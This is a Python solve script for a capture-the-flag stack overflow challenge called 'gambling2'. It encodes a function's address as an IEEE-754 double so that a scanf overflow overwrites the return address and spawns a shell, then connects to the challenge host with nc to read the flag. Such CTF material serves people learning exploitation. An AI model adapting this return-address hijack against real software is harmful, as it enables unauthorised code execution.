#!/usr/bin/env python3
"""Build the gambling2 payload and check it against the binary's own symbols.

gamble() reads 7 doubles with scanf("%lf"...) into float f[4]. The 7th double lands on the
saved return address, so encoding print_money()'s address as a double redirects the return into
system("/bin/sh"). scanf copies the raw IEEE-754 bytes, so any bit pattern is accepted.

    python3 solve.py            # prints the payload and verifies the encoded address
"""
import struct
import subprocess
import sys

BINARY = sys.argv[1] if len(sys.argv) > 1 else "gambling"


def print_money_addr(path):
    out = subprocess.run(["nm", path], capture_output=True, text=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2] == "print_money":
            return int(parts[0], 16)
    raise SystemExit("print_money not found (need nm and the binary)")


def main():
    try:
        addr = print_money_addr(BINARY)
    except (FileNotFoundError, SystemExit):
        addr = 0x080492C0   # from the released binary
    # 64-bit double whose high 32 bits are print_money and low 32 bits are padding
    bits = (addr << 32) | 0x41414141
    crafted = struct.unpack("<d", struct.pack("<Q", bits))[0]
    payload = f"0 0 0 0 0 0 {crafted!r}"
    print(f"print_money = {addr:#010x}")
    print(f"crafted double = {crafted!r}")
    print(f"payload = {payload}")
    # sanity check: the double really encodes the address
    back = struct.unpack("<Q", struct.pack("<d", crafted))[0] >> 32
    assert back == addr, (hex(back), hex(addr))
    print("encoded address matches print_money")
    print("remote: nc challs.umdctf.io 31005, send the payload, then `cat flag.txt`")


if __name__ == "__main__":
    main()
